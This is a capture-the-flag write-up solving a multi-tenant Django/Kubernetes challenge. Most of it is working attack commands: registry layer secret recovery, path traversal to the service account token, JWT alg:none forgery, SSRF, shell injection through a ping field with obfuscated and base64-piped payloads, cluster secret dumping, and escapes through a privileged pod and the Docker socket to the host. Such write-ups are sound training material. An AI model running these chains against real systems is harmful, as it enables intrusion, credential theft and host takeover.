# Break the SaaS — hamCTF

**Category:** Web / Cloud (Kubernetes)  
**Challenge:** Break the SaaS — a multi-tenant Django REST backend running in a kind Kubernetes cluster with Traefik ingress, an internal admin panel, and a privileged escape-zone pod.

## Overview

The backend is a Django + DRF app exposed via Traefik. It has a few things going on: a ping diagnostic tool, a webhook tester, an audit report download endpoint, a hidden internal flag endpoint, JWT auth, and an IDOR on org reports. There's also an `admin-panel` service running in the `internal-tools` namespace and a privileged pod in `escape-zone`.

The challenge image is published to a public Harbor registry at `hub.hamdocker.ir/seoeh/hamamooz_challlenges:backend`. That detail turns out to matter quite a bit.

I ended up finding all 11 flags. Here's how each one went.

---

## F1 — Docker layer leak

**Vulnerability:** The `.env` file was `COPY`'d into the image during build and then removed with `RUN rm`. In Docker, that just adds a whiteout layer on top — the actual bytes still exist in the earlier layer that did the `COPY`. Anyone who can pull the image can recover it.

**Extraction:**

Grab a pull token from the Harbor registry, get the manifest for the `backend` tag, then download the layer blobs. The layers are gzipped tarballs. I iterated through the smaller ones looking for `app/.env`:

```bash
TOK=$(curl -sk "https://hub.hamdocker.ir/v2/token?service=harbor-registry&scope=repository:seoeh/hamamooz_challlenges:pull" \
     | python3 -c 'import json,sys;print(json.load(sys.stdin)["token"])')

curl -sk -H "Authorization: Bearer $TOK" \
  "https://hub.hamdocker.ir/v2/seoeh/hamamooz_challlenges/tags/list"

curl -sk -H "Authorization: Bearer $TOK" \
  -H "Accept: application/vnd.docker.distribution.manifest.v2+json" \
  "https://hub.hamdocker.ir/v2/seoeh/hamamooz_challlenges/manifests/backend" | jq .
```

The layer with digest `sha256:cad298f...` (180 bytes compressed) contains `app/.env`. The next layer has the whiteout file `.wh..env`. Download and untar:

```bash
curl -sk -H "Authorization: Bearer $TOK" \
  "https://hub.hamdocker.ir/v2/seoeh/hamamooz_challlenges/blobs/sha256:cad298f9538d92ea9901f8de6c41611a63d62c56e914c9bd802ff01080456041" \
  | tar xz
cat app/.env
```

---

## F2 — Swagger schema exposure

**Vulnerability:** The app uses `drf-spectacular` to serve an OpenAPI schema. The route `/api/schema/` (and `/swagger.json`) requires no auth. The robots.txt tells crawlers to avoid it, but that only stops honest bots. The flag is embedded directly in the API `info.description` field.

**Extraction:**

```bash
curl -sk https://ctf.seoeh.ir/swagger.json | python3 -c "import json,sys; print(json.load(sys.stdin)['info']['description'])"
```

This also reveals all the hidden routes, including `/api/internal/flag` and the admin dashboard, which makes the rest of the challenge way easier to plan.

---

## F3 — Hidden debug endpoint

**Vulnerability:** `/api/internal/flag` is a hidden DRF view. It checks for `X-Debug-Mode: true` in the request headers and returns a flag. No auth at all. The route was discoverable from the Swagger schema we just pulled.

**Extraction:**

```bash
curl -sk -H "X-Debug-Mode: true" https://ctf.seoeh.ir/api/internal/flag
```

Returns `{"flag": "..."}`.

---

## F4 — Path traversal (arbitrary file read)

**Vulnerability:** `/api/reports/download?file=` uses `os.path.join("/app/reports/", file)` without normalizing the path. A `../` sequence escapes the directory. The endpoint also has a handy directory listing mode — pass a directory path and it shows the contents.

**Extraction:**

First, list `/app` to get the lay of the land:

```bash
curl -sk "https://ctf.seoeh.ir/api/reports/download?file=.."
```

That shows the app structure including `flag.txt` sitting right next to `reports/`:

```bash
curl -sk "https://ctf.seoeh.ir/api/reports/download?file=../flag.txt"
```

From there it becomes a full arbitrary file read. The two most useful reads:

**Environment variables** (leaks the JWT secret, flag values, K8s service IP, etc.):

```bash
curl -sk "https://ctf.seoeh.ir/api/reports/download?file=../../../proc/1/environ" | tr '\0' '\n'
```

**Kubernetes service account token:**

```bash
curl -sk "https://ctf.seoeh.ir/api/reports/download?file=../../../var/run/secrets/kubernetes.io/serviceaccount/token"
```

The SA token turns out to be very powerful — it has `get/list/watch` on everything cluster-wide.

---

## F5 — IDOR on org reports

**Vulnerability:** `/api/orgs/<org_id>/reports/<report_id>` returns report data including `secret_note` with no authentication and no tenant ownership check. The view is `AllowAny`. The seed script placed a flag in org 2, report 2's `secret_note`. Everything else is either a decoy or returns "not found".

**Extraction:**

```bash
curl -sk https://ctf.seoeh.ir/api/orgs/2/reports/2
```

Returns `{"title": "Globex Internal Audit", "secret_note": "..."}`.

I brute-forced org 1–5 and report 1–5 to be thorough, but this was the only one that returned something interesting.

---

## F6 — JWT alg:none / weak secret

**Vulnerability:** The JWT decode helper in `config/jwt.pyc` uses `get_unverified_header()` to check the algorithm. If the header says `alg: none`, it decodes the payload without verifying any signature. On top of that, the actual HS256 secret is `changeme123` (visible in the env leak from F4), so even a properly signed token is forgeable.

**Extraction (alg:none method):**

```bash
TOKEN=$(python3 -c "
import base64, json
def b(d): return base64.urlsafe_b64encode(json.dumps(d,separators=(',',':')).encode()).rstrip(b'=').decode()
print(b({'alg':'none','typ':'JWT'})+'.'+b({'sub':'1','role':'admin'})+'.')
")
curl -sk -H "Authorization: Bearer $TOKEN" https://ctf.seoeh.ir/admin/dashboard
```

**Extraction (signed with leaked secret):**

```bash
python3 -c "
import jwt
token = jwt.encode({'user_id':1,'username':'admin','role':'admin'}, 'changeme123', algorithm='HS256')
print(token)
"
# then curl with that token as Bearer
```

Both return `{"flag": "..."}`.

---

## F7 — SSRF to internal services

**Vulnerability:** `/api/webhooks/test` takes a URL, method, and optional headers, then makes the request server-side with `verify=False` and no destination allowlist. The response body is returned. The `runworker.pyc` code references `admin-panel.internal-tools.svc.cluster.local` which is only reachable from inside the cluster.

**Extraction:**

```bash
curl -sk -X POST https://ctf.seoeh.ir/api/webhooks/test \
  -H "Content-Type: application/json" \
  -d '{"url":"http://admin-panel.internal-tools.svc.cluster.local/","method":"GET"}'
```

The response is the admin panel's HTML page, and the flag is sitting in an HTML comment.

---

## F8 — K8s service account token → cluster-wide secret read

**Vulnerability:** The backend pod's SA has a `ClusterRoleBinding` to `cluster-reader`, which grants `get/list/watch` on `*` (all resources, all API groups) cluster-wide. The token is world-readable inside the pod (as usual), and we already have arbitrary file read (F4) and command execution (F9). The `ctf-secrets` namespace contains a `flag-secret` with base64-encoded flag data.

**Extraction:**

The webhook SSRF is limited to 3-second timeouts, which wasn't reliable enough for this. Instead I used the command injection (F9) to run Python directly inside the pod:

```bash
curl -sk -X POST https://ctf.seoeh.ir/api/diag/ping \
  -H 'Content-Type: application/json' \
  -d '{"host":"127.0.0.1; python3 -c \"import urllib.request,json,base64,ssl;ctx=ssl._create_unverified_context();tok=open(chr(47)+chr(118)+chr(97)+chr(114)+chr(47)+chr(114)+chr(117)+chr(110)+chr(47)+chr(115)+chr(101)+chr(99)+chr(114)+chr(101)+chr(116)+chr(115)+chr(47)+chr(107)+chr(117)+chr(98)+chr(101)+chr(114)+chr(110)+chr(101)+chr(116)+chr(101)+chr(115)+chr(47)+chr(105)+chr(111)+chr(47)+chr(115)+chr(101)+chr(114)+chr(118)+chr(105)+chr(99)+chr(101)+chr(97)+chr(99)+chr(99)+chr(111)+chr(117)+chr(110)+chr(116)+chr(47)+chr(116)+chr(111)+chr(107)+chr(101)+chr(110)).read().strip();req=urllib.request.Request(chr(104)+chr(116)+chr(116)+chr(112)+chr(115)+chr(58)+chr(47)+chr(47)+chr(107)+chr(117)+chr(98)+chr(101)+chr(114)+chr(110)+chr(101)+chr(116)+chr(101)+chr(115)+chr(46)+chr(100)+chr(101)+chr(102)+chr(97)+chr(117)+chr(108)+chr(116)+chr(46)+chr(115)+chr(118)+chr(99)+chr(46)+chr(99)+chr(108)+chr(117)+chr(115)+chr(116)+chr(101)+chr(114)+chr(46)+chr(108)+chr(111)+chr(99)+chr(97)+chr(108)+chr(47)+chr(97)+chr(112)+chr(105)+chr(47)+chr(118)+chr(49)+chr(47)+chr(115)+chr(101)+chr(99)+chr(114)+chr(101)+chr(116)+chr(115),headers={chr(65)+chr(117)+chr(116)+chr(104)+chr(111)+chr(114)+chr(105)+chr(122)+chr(97)+chr(116)+chr(105)+chr(111)+chr(110):chr(66)+chr(101)+chr(97)+chr(114)+chr(101)+chr(32)+tok});d=json.load(urllib.request.urlopen(req,context=ctx,timeout=10));[print(base64.b64decode(i[chr(100)+chr(97)+chr(116)+chr(97)][chr(102)+chr(108)+chr(97)+chr(103)]).decode()) for i in d[chr(105)+chr(116)+chr(101)+chr(109)+chr(115)] if chr(102)+chr(108)+chr(97)+chr(103) in (i.get(chr(100)+chr(97)+chr(116)+chr(97)) or {})]\""}'
```

A cleaner approach — write a script file and pipe it:

```bash
INNER='python3 << "PYEOF"
import urllib.request, json, base64, ssl
ctx = ssl._create_unverified_context()
tok = open("/var/run/secrets/kubernetes.io/serviceaccount/token").read().strip()
req = urllib.request.Request(
    "https://kubernetes.default.svc/api/v1/secrets",
    headers={"Authorization": "Bearer " + tok}
)
d = json.load(urllib.request.urlopen(req, context=ctx, timeout=10))
for item in d["items"]:
    data = item.get("data") or {}
    if "flag" in data:
        print(base64.b64decode(data["flag"]).decode())
PYEOF'
B64=$(printf '%s' "$INNER" | base64 | tr -d '\n')
curl -sk -X POST https://ctf.seoeh.ir/api/diag/ping -H 'Content-Type: application/json' \
  -d "{\"host\":\"127.0.0.1; echo $B64 | base64 -d | sh\"}"
```

---

## F9 — Command injection in ping

**Vulnerability:** `/api/diag/ping` builds the shell command by string concatenation: `subprocess.run(f"ping -c 2 {host}", shell=True, ...)`. No input validation, no escaping. The `host` parameter goes straight into a shell. There's a `preexec_fn` that sets `RLIMIT_FSIZE`, but that only limits file write size — it doesn't affect command execution. The output is returned in the JSON response.

**Extraction:**

The path to the flag file was visible in the decompiled `views.pyc` (`PING_FLAG_PATH` points to `/opt/.sysdiag-7e3f9a2c4b1d8e5f/flag.txt`):

```bash
curl -sk -X POST https://ctf.seoeh.ir/api/diag/ping \
  -H 'Content-Type: application/json' \
  -d '{"host":"127.0.0.1; cat /opt/.sysdiag-7e3f9a2c4b1d8e5f/flag.txt"}'
```

This is also the primitive that powers F8, F10, and F11 — basically all the Kubernetes exploitation runs through this injection point.

---

## F10 — Privileged pod escape via kubectl exec

**Vulnerability:** The `escape-zone` namespace has a pod called `legacy-worker` that runs with `privileged: true` and mounts the node's root filesystem at `/host` via `hostPath: /`. Its init container writes a flag to `/host/var/lib/node-data/flag.txt`. Our SA has `pods/exec` permission in that namespace (confirmed via `SelfSubjectRulesReview` through the K8s API). The backend image has `kubectl` installed, which means our command injection is basically a kubectl client.

**Extraction:**

```bash
INNER='TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); \
kubectl --server=https://kubernetes.default.svc \
  --token=$TOKEN \
  --certificate-authority=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  exec -n escape-zone legacy-worker -- \
  cat /host/var/lib/node-data/flag.txt'
B64=$(printf '%s' "$INNER" | base64 | tr -d '\n')
curl -sk -X POST https://ctf.seoeh.ir/api/diag/ping -H 'Content-Type: application/json' \
  -d "{\"host\":\"127.0.0.1; echo $B64 | base64 -d | sh\"}"
```

The trick here is that `kubectl` is already in the image — no need to install anything. The base64 encode/decode avoids shell quoting issues with the pipe.

---

## F11 — Docker socket escape to host

**Vulnerability:** This is the kind-specific finale. Kind runs every Kubernetes node as a Docker container. The host's Docker socket is mounted into each kind node at `/var/run/docker.sock`. From inside `legacy-worker`, the node's root filesystem is at `/host`, so the socket is at `/host/run/docker.sock`. Talking to that Docker API gives you control over the kind node container — and from there, you can create a new container with the actual host filesystem mounted.

The final flag was placed at `/home/ubuntu/flag.txt` on the host machine.

**Extraction:**

This runs inside `legacy-worker` (reached via F9 + F10):

```bash
INNER='TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); \
kubectl --server=https://kubernetes.default.svc \
  --token=$TOKEN \
  --certificate-authority=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  exec -n escape-zone legacy-worker -- sh -c "
S=/host/run/docker.sock

# Create a container that mounts the host root
curl -s --unix-socket \$S -X POST -H \"Content-Type: application/json\" \
  -d '"'"'{"Image":"ctf/backend:latest","User":"0","HostConfig":{"Binds":["/:/host"]},"Cmd":["sh","-c","cat /host/home/ubuntu/flag.txt"]}'"'"' \
  \"http://localhost/v1.41/containers/create?name=esc\"

# Start it
curl -s --unix-socket \$S -X POST \"http://localhost/v1.41/containers/esc/start\"

# Read the flag from the container logs
curl -s --unix-socket \$S \"http://localhost/v1.41/containers/esc/logs?stdout=1&stderr=1\"
"'
B64=$(printf '%s' "$INNER" | base64 | tr -d '\n')
curl -sk -X POST https://ctf.seoeh.ir/api/diag/ping -H 'Content-Type: application/json' \
  -d "{\"host\":\"127.0.0.1; echo $B64 | base64 -d | sh\"}"
```

The Docker API call creates a throwaway container from an existing image, bind-mounts the host root, runs `cat` on the flag file, and the output comes back through the container logs API.

---

## Notes

- The `.pyc` files in the image are useful for understanding the app logic — `strings` on them reveals route names, function signatures, and internal service URLs that aren't visible from the outside.
- The webhook SSRF has a 3-second timeout, which made it unreliable for Kubernetes API calls that might be slow. Running commands directly through the ping injection was much more reliable.
- The SA token from the file read and the one the pod uses at runtime are the same thing. Either way of getting it works.
- For the path traversal, reading `/proc/1/environ` is the single most valuable file read in the whole challenge. It leaks the JWT secret, all the flag values stored in env vars, and the K8s service IP.
